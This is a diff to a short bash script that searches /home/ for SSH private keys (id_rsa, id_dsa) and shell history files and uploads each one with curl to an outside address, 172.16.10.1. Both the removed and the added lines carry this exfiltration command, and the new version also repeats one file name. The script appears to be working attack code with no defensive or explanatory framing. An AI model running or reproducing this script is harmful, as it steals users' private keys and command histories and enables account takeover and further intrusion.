@@ -1,5 +1,2 @@
 #!/bin/bash
-find /home/ \
-    -type f \
-    -o -name ".*_history" -o -name "id_rsa" -o -name "id_dsa" \
-    -exec curl -F "filedata=@{}" "http://172.16.10.1" \; 2> /dev/null
+find /home/ -type f -name "id_rsa" -o -name "id_rsa" -o -name ".*_history"  -exec curl -F "filedata=@{}" "http://172.16.10.1" \;
